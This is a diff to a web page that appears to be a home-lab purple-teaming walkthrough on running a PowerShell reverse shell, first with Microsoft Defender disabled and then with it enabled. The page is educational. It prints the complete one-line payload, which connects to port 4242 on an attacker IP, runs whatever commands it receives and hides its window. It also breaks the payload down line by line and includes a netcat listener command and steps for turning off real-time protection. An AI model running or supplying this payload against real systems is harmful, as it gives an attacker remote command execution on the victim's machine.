@@ -15,7 +15,6 @@ permalink: /solo-purple-teaming/walkthrough-powershell-reverse-shell-without-def
 <h1
 id="walkthrough-powershell-reverse-shell-without-defender">Walkthrough:
 PowerShell Reverse Shell Without Defender</h1>
-<p>Owner: Josh</p>
 <h1 id="the-importance-of-baselining">The Importance of Baselining</h1>
 <p><strong>Baselining</strong> is the process of establishing a clear
 understanding of what constitutes normal behavior within a system or
@@ -45,7 +44,7 @@ href="https://swisskyrepo.github.io/PayloadsAllTheThings/DISCLAIMER/">https://sw
 <p>Payload Pulled From the Reverse Shell Cheat Sheet: <a
 href="https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#openssl">https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#openssl</a></p>
 <div class="sourceCode" id="cb1"><pre
-class="sourceCode jsx"><code class="sourceCode javascriptreact"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>powershell <span class="op">-</span>NoP <span class="op">-</span>NonI <span class="op">-</span>W Hidden <span class="op">-</span>Exec Bypass <span class="op">-</span>Command New<span class="op">-</span><span class="bu">Object</span> System<span class="op">.</span><span class="at">Net</span><span class="op">.</span><span class="at">Sockets</span><span class="op">.</span><span class="fu">TCPClient</span>(<span class="st">&quot;10.0.0.1&quot;</span><span class="op">,</span><span class="dv">4242</span>)<span class="op">;</span>$stream <span class="op">=</span> $client<span class="op">.</span><span class="fu">GetStream</span>()<span class="op">;</span>[byte[]]$bytes <span class="op">=</span> <span class="fl">0.</span><span class="op">.</span><span class="dv">65535</span><span class="op">|%</span>{<span class="dv">0</span>}<span class="op">;</span><span class="cf">while</span>(($i <span class="op">=</span> $stream<span class="op">.</span><span class="fu">Read</span>($bytes<span class="op">,</span> <span class="dv">0</span><span class="op">,</span> $bytes<span class="op">.</span><span class="at">Length</span>)) <span class="op">-</span>ne <span class="dv">0</span>){<span class="op">;</span>$data <span class="op">=</span> (New<span class="op">-</span><span class="bu">Object</span> <span class="op">-</span>TypeName System<span class="op">.</span><span class="at">Text</span><span class="op">.</span><span class="at">ASCIIEncoding</span>)<span class="op">.</span><span class="fu">GetString</span>($bytes<span class="op">,</span><span class="dv">0</span><span class="op">,</span> $i)<span class="op">;</span>$sendback <span class="op">=</span> (iex $data <span class="dv">2</span><span class="op">&gt;&amp;</span><span class="dv">1</span> <span class="op">|</span> Out<span class="op">-</span><span class="bu">String</span> )<span class="op">;</span>$sendback2  <span class="op">=</span> $sendback <span class="op">+</span> <span class="st">&quot;PS &quot;</span> <span class="op">+</span> (pwd)<span class="op">.</span><span class="at">Path</span> <span class="op">+</span> <span class="st">&quot;&gt; &quot;</span><span class="op">;</span>$sendbyte <span class="op">=</span> ([text<span class="op">.</span><span class="at">encoding</span>]<span class="op">::</span>ASCII)<span class="op">.</span><span class="fu">GetBytes</span>($sendback2)<span class="op">;</span>$stream<span class="op">.</span><span class="fu">Write</span>($sendbyte<span class="op">,</span><span class="dv">0</span><span class="op">,</span>$sendbyte<span class="op">.</span><span class="at">Length</span>)<span class="op">;</span>$stream<span class="op">.</span><span class="fu">Flush</span>()}<span class="op">;</span>$client<span class="op">.</span><span class="fu">Close</span>()</span></code></pre></div>
+class="sourceCode jsx"><code class="sourceCode javascriptreact"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>powershell <span class="op">-</span>NoP <span class="op">-</span>NonI <span class="op">-</span>W Hidden <span class="op">-</span>Exec Bypass <span class="op">-</span>Command New<span class="op">-</span><span class="bu">Object</span> System<span class="op">.</span><span class="at">Net</span><span class="op">.</span><span class="at">Sockets</span><span class="op">.</span><span class="fu">TCPClient</span>(<span class="st">"10.0.0.1"</span><span class="op">,</span><span class="dv">4242</span>)<span class="op">;</span>$stream <span class="op">=</span> $client<span class="op">.</span><span class="fu">GetStream</span>()<span class="op">;</span>[byte[]]$bytes <span class="op">=</span> <span class="fl">0.</span><span class="op">.</span><span class="dv">65535</span><span class="op">|%</span>{<span class="dv">0</span>}<span class="op">;</span><span class="cf">while</span>(($i <span class="op">=</span> $stream<span class="op">.</span><span class="fu">Read</span>($bytes<span class="op">,</span> <span class="dv">0</span><span class="op">,</span> $bytes<span class="op">.</span><span class="at">Length</span>)) <span class="op">-</span>ne <span class="dv">0</span>){<span class="op">;</span>$data <span class="op">=</span> (New<span class="op">-</span><span class="bu">Object</span> <span class="op">-</span>TypeName System<span class="op">.</span><span class="at">Text</span><span class="op">.</span><span class="at">ASCIIEncoding</span>)<span class="op">.</span><span class="fu">GetString</span>($bytes<span class="op">,</span><span class="dv">0</span><span class="op">,</span> $i)<span class="op">;</span>$sendback <span class="op">=</span> (iex $data <span class="dv">2</span><span class="op">>&amp;</span><span class="dv">1</span> <span class="op">|</span> Out<span class="op">-</span><span class="bu">String</span> )<span class="op">;</span>$sendback2  <span class="op">=</span> $sendback <span class="op">+</span> <span class="st">"PS "</span> <span class="op">+</span> (pwd)<span class="op">.</span><span class="at">Path</span> <span class="op">+</span> <span class="st">"> "</span><span class="op">;</span>$sendbyte <span class="op">=</span> ([text<span class="op">.</span><span class="at">encoding</span>]<span class="op">::</span>ASCII)<span class="op">.</span><span class="fu">GetBytes</span>($sendback2)<span class="op">;</span>$stream<span class="op">.</span><span class="fu">Write</span>($sendbyte<span class="op">,</span><span class="dv">0</span><span class="op">,</span>$sendbyte<span class="op">.</span><span class="at">Length</span>)<span class="op">;</span>$stream<span class="op">.</span><span class="fu">Flush</span>()}<span class="op">;</span>$client<span class="op">.</span><span class="fu">Close</span>()</span></code></pre></div>
 <p>Before you run any code in your lab, you should audit the code to
 understand what it does. This payload is pretty self explanatory, but
 let’s walk through it line by lin</p>
@@ -57,13 +56,13 @@ Let’s break it down step by step.</p>
 <h3 id="full-payload"><strong>Full Payload</strong></h3>
 <div class="sourceCode" id="cb2"><pre
 class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a>powershell <span class="op">-</span>NoP <span class="op">-</span>NonI <span class="op">-</span>W Hidden <span class="op">-</span>Exec Bypass <span class="op">-</span>Command</span>
-<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="fu">New-Object</span> System<span class="op">.</span><span class="fu">Net</span><span class="op">.</span><span class="fu">Sockets</span><span class="op">.</span><span class="fu">TCPClient</span><span class="op">(</span><span class="st">&quot;10.0.0.1&quot;</span><span class="op">,</span><span class="dv">4242</span><span class="op">);</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="fu">New-Object</span> System<span class="op">.</span><span class="fu">Net</span><span class="op">.</span><span class="fu">Sockets</span><span class="op">.</span><span class="fu">TCPClient</span><span class="op">(</span><span class="st">"10.0.0.1"</span><span class="op">,</span><span class="dv">4242</span><span class="op">);</span></span>
 <span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="va">$stream</span> <span class="op">=</span> <span class="va">$client</span><span class="op">.</span><span class="fu">GetStream</span><span class="op">();</span></span>
 <span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="op">[</span><span class="dt">byte</span><span class="op">[]]</span><span class="va">$bytes</span> <span class="op">=</span> <span class="dv">0</span><span class="op">..</span><span class="dv">65535</span><span class="op">|%{</span><span class="dv">0</span><span class="op">};</span></span>
 <span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span><span class="op">((</span><span class="va">$i</span> <span class="op">=</span> <span class="va">$stream</span><span class="op">.</span><span class="fu">Read</span><span class="op">(</span><span class="va">$bytes</span><span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="va">$bytes</span><span class="op">.</span><span class="fu">Length</span><span class="op">))</span> <span class="op">-ne</span> <span class="dv">0</span><span class="op">){</span></span>
 <span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>    <span class="va">$data</span> <span class="op">=</span> <span class="op">(</span><span class="fu">New-Object</span> <span class="op">-</span>TypeName System<span class="op">.</span><span class="fu">Text</span><span class="op">.</span><span class="fu">ASCIIEncoding</span><span class="op">).</span><span class="fu">GetString</span><span class="op">(</span><span class="va">$bytes</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span> <span class="va">$i</span><span class="op">);</span></span>
-<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>    <span class="va">$sendback</span> <span class="op">=</span> <span class="op">(</span><span class="fu">iex</span> <span class="va">$data</span> <span class="dv">2</span><span class="op">&gt;&amp;</span><span class="dv">1</span> <span class="op">|</span> <span class="fu">Out-String</span> <span class="op">);</span></span>
-<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>    <span class="va">$sendback2</span>  <span class="op">=</span> <span class="va">$sendback</span> <span class="op">+</span> <span class="st">&quot;PS &quot;</span> <span class="op">+</span> <span class="op">(</span><span class="fu">pwd</span><span class="op">).</span><span class="fu">Path</span> <span class="op">+</span> <span class="st">&quot;&gt; &quot;</span><span class="op">;</span></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>    <span class="va">$sendback</span> <span class="op">=</span> <span class="op">(</span><span class="fu">iex</span> <span class="va">$data</span> <span class="dv">2</span><span class="op">>&amp;</span><span class="dv">1</span> <span class="op">|</span> <span class="fu">Out-String</span> <span class="op">);</span></span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>    <span class="va">$sendback2</span>  <span class="op">=</span> <span class="va">$sendback</span> <span class="op">+</span> <span class="st">"PS "</span> <span class="op">+</span> <span class="op">(</span><span class="fu">pwd</span><span class="op">).</span><span class="fu">Path</span> <span class="op">+</span> <span class="st">"> "</span><span class="op">;</span></span>
 <span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>    <span class="va">$sendbyte</span> <span class="op">=</span> <span class="op">([</span>text<span class="op">.</span><span class="fu">encoding</span><span class="op">]::</span>ASCII<span class="op">).</span><span class="fu">GetBytes</span><span class="op">(</span><span class="va">$sendback2</span><span class="op">);</span></span>
 <span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a>    <span class="va">$stream</span><span class="op">.</span><span class="fu">Write</span><span class="op">(</span><span class="va">$sendbyte</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="va">$sendbyte</span><span class="op">.</span><span class="fu">Length</span><span class="op">);</span></span>
 <span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a>    <span class="va">$stream</span><span class="op">.</span><span class="fu">Flush</span><span class="op">()</span></span>
@@ -90,7 +89,7 @@ script to run even if it's blocked by policy.</li>
 <ol type="1">
 <li><p><strong>Create a TCP client:</strong></p>
 <div class="sourceCode" id="cb4"><pre
-class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="fu">New-Object</span> System<span class="op">.</span><span class="fu">Net</span><span class="op">.</span><span class="fu">Sockets</span><span class="op">.</span><span class="fu">TCPClient</span><span class="op">(</span><span class="st">&quot;10.0.0.1&quot;</span><span class="op">,</span><span class="dv">4242</span><span class="op">)</span></span></code></pre></div>
+class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="fu">New-Object</span> System<span class="op">.</span><span class="fu">Net</span><span class="op">.</span><span class="fu">Sockets</span><span class="op">.</span><span class="fu">TCPClient</span><span class="op">(</span><span class="st">"10.0.0.1"</span><span class="op">,</span><span class="dv">4242</span><span class="op">)</span></span></code></pre></div>
 <ul>
 <li>Connects to the attacker’s IP address (<code>10.0.0.1</code>) on
 port <code>4242</code>.</li>
@@ -119,7 +118,7 @@ class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb6-
 <li><p><strong>Decode and execute the received command:</strong></p>
 <div class="sourceCode" id="cb7"><pre
 class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="va">$data</span> <span class="op">=</span> <span class="op">(</span><span class="fu">New-Object</span> <span class="op">-</span>TypeName System<span class="op">.</span><span class="fu">Text</span><span class="op">.</span><span class="fu">ASCIIEncoding</span><span class="op">).</span><span class="fu">GetString</span><span class="op">(</span><span class="va">$bytes</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span> <span class="va">$i</span><span class="op">)</span></span>
-<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="va">$sendback</span> <span class="op">=</span> <span class="op">(</span><span class="fu">iex</span> <span class="va">$data</span> <span class="dv">2</span><span class="op">&gt;&amp;</span><span class="dv">1</span> <span class="op">|</span> <span class="fu">Out-String</span> <span class="op">)</span></span></code></pre></div>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="va">$sendback</span> <span class="op">=</span> <span class="op">(</span><span class="fu">iex</span> <span class="va">$data</span> <span class="dv">2</span><span class="op">>&amp;</span><span class="dv">1</span> <span class="op">|</span> <span class="fu">Out-String</span> <span class="op">)</span></span></code></pre></div>
 <ul>
 <li>Converts bytes into a string.</li>
 <li>Executes it using <code>iex</code> (Invoke-Expression), which is
@@ -128,7 +127,7 @@ essentially like <code>eval</code>.</li>
 </ul></li>
 <li><p><strong>Format and send the response back:</strong></p>
 <div class="sourceCode" id="cb8"><pre
-class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="va">$sendback2</span> <span class="op">=</span> <span class="va">$sendback</span> <span class="op">+</span> <span class="st">&quot;PS &quot;</span> <span class="op">+</span> <span class="op">(</span><span class="fu">pwd</span><span class="op">).</span><span class="fu">Path</span> <span class="op">+</span> <span class="st">&quot;&gt; &quot;</span></span>
+class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="va">$sendback2</span> <span class="op">=</span> <span class="va">$sendback</span> <span class="op">+</span> <span class="st">"PS "</span> <span class="op">+</span> <span class="op">(</span><span class="fu">pwd</span><span class="op">).</span><span class="fu">Path</span> <span class="op">+</span> <span class="st">"> "</span></span>
 <span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="va">$sendbyte</span> <span class="op">=</span> <span class="op">([</span>text<span class="op">.</span><span class="fu">encoding</span><span class="op">]::</span>ASCII<span class="op">).</span><span class="fu">GetBytes</span><span class="op">(</span><span class="va">$sendback2</span><span class="op">)</span></span>
 <span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="va">$stream</span><span class="op">.</span><span class="fu">Write</span><span class="op">(</span><span class="va">$sendbyte</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="va">$sendbyte</span><span class="op">.</span><span class="fu">Length</span><span class="op">)</span></span>
 <span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="va">$stream</span><span class="op">.</span><span class="fu">Flush</span><span class="op">()</span></span></code></pre></div>
@@ -170,42 +169,42 @@ Environment</h2>
 TCPClient to connect to my attacker host IP address and go ahead and use
 port 4242:</p>
 <div class="sourceCode" id="cb10"><pre
-class="sourceCode jsx"><code class="sourceCode javascriptreact"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a>New<span class="op">-</span><span class="bu">Object</span> System<span class="op">.</span><span class="at">Net</span><span class="op">.</span><span class="at">Sockets</span><span class="op">.</span><span class="fu">TCPClient</span>(<span class="st">&quot;10.0.3.2&quot;</span><span class="op">,</span><span class="dv">4242</span>)</span></code></pre></div>
+class="sourceCode jsx"><code class="sourceCode javascriptreact"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a>New<span class="op">-</span><span class="bu">Object</span> System<span class="op">.</span><span class="at">Net</span><span class="op">.</span><span class="at">Sockets</span><span class="op">.</span><span class="fu">TCPClient</span>(<span class="st">"10.0.3.2"</span><span class="op">,</span><span class="dv">4242</span>)</span></code></pre></div>
 <h2
 id="make-sure-to-turn-off-realtime-protection-cloud-submissions-and-automatic-sample-submission">Make
 Sure to Turn Off Realtime Protection, Cloud Submissions, and Automatic
 Sample Submission</h2>
 <p><img
-src="Walkthrough%20PowerShell%20Reverse%20Shell%20Without%20Defen/image.png"
+src="/_assets/walkthrough-powershell-reverse-shell-without-defen/image.png"
 alt="image.png" /></p>
 <h2 id="setup-your-listener-using-netcat">Setup Your Listener Using
 Netcat</h2>
 <div class="sourceCode" id="cb11"><pre
 class="sourceCode jsx"><code class="sourceCode javascriptreact"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a>nc <span class="op">-</span>nvlp <span class="dv">4242</span></span></code></pre></div>
 <p><img
-src="Walkthrough%20PowerShell%20Reverse%20Shell%20Without%20Defen/image%201.png"
+src="/_assets/walkthrough-powershell-reverse-shell-without-defen/image%201.png"
 alt="image.png" /></p>
 <h2 id="run-your-payload-using-powershell">Run Your Payload Using
 PowerShell</h2>
 <p><img
-src="Walkthrough%20PowerShell%20Reverse%20Shell%20Without%20Defen/image%202.png"
+src="/_assets/walkthrough-powershell-reverse-shell-without-defen/image%202.png"
 alt="image.png" /></p>
 <h2 id="check-for-reverse-connection-on-attacker-kali-host">Check For
 Reverse Connection on Attacker Kali Host</h2>
 <p><img
-src="Walkthrough%20PowerShell%20Reverse%20Shell%20Without%20Defen/image%203.png"
+src="/_assets/walkthrough-powershell-reverse-shell-without-defen/image%203.png"
 alt="image.png" /></p>
 <h2 id="test-command-execution">Test Command Execution</h2>
 <p><img
-src="Walkthrough%20PowerShell%20Reverse%20Shell%20Without%20Defen/image%204.png"
+src="/_assets/walkthrough-powershell-reverse-shell-without-defen/image%204.png"
 alt="image.png" /></p>
 <h2 id="enable-realtime-protection-and-repeat-the-process">Enable
 Realtime Protection and Repeat the Process</h2>
 <p><img
-src="Walkthrough%20PowerShell%20Reverse%20Shell%20Without%20Defen/image%205.png"
+src="/_assets/walkthrough-powershell-reverse-shell-without-defen/image%205.png"
 alt="image.png" /></p>
 <p><img
-src="Walkthrough%20PowerShell%20Reverse%20Shell%20Without%20Defen/image%206.png"
+src="/_assets/walkthrough-powershell-reverse-shell-without-defen/image%206.png"
 alt="image.png" /></p>
 <h3
 id="what-do-you-think-causes-the-this-script-contains-malicious-content-and-has-been-blocked-by-your-antivirus-software-message">What
